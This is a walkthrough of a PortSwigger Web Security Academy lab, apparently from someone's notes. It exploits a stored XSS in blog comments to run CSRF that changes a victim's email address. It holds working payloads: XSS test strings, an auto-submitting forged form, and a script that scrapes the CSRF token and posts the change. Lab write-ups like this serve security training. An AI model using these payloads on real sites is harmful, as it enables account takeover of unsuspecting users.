
# Exploiting XSS to perform CSRF

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

Learning path: If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/exploiting

- https://portswigger.net/blog/exploiting-xss-in-post-requests

- https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send


![img](images/Exploiting%20XSS%20to%20perform%20CSRF/1.png)

---------------------------------------------


There is a function to update the email:



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/2.png)

It is a POST message:



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/3.png)


There is a function to post comments:



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/4.png)


These payload work:

```
</p><img src=x onerror=alert(1) /><p>
<script>alert(1)</script>
```



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/5.png)


We use this payload (similar to the one in https://portswigger.net/blog/exploiting-xss-in-post-requests):

```
<form name=TheForm action=https://0a8100660449e28b80a50877005400f4.web-security-academy.net/my-account/change-email method=post>
<input type=hidden name="csrf" value="wV6Kw7g2mIv6JLKjoQjmb3Nd6BhhXbmg">
<input type=hidden name="email" value="test7@test.com">
</form>
<script>
document.TheForm.submit();
</script>
```


When accessing the page, it creates a POST message:



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/6.png)


And the email of my user changes to test7@test.com:



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/7.png)


It is not working because we are using a hardcoded value for the CSRF token. We can take the value from the hidden value “csrf” of the page:



![img](images/Exploiting%20XSS%20to%20perform%20CSRF/8.png)


The csrf element uses the name so we can grab the content with:

```
document.getElementsByName('csrf')[0].value
```

However, if we do this we can not create a form with a csrf tag like we did before. But we can grab the CSRF token from "/my-account" and use a regular expression to get the content and set the value of the csrf element in the created form, and the submit the form:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  console.log(csrf_token);
  var xhr = new XMLHttpRequest();
  xhr.open("POST", '/my-account/change-email', true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = () => { 
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    }
  }
  xhr.send("email=test12@test.com&csrf="+csrf_token);
};
</script>
```

![img](images/Exploiting%20XSS%20to%20perform%20CSRF/9.png)
![img](images/Exploiting%20XSS%20to%20perform%20CSRF/10.png)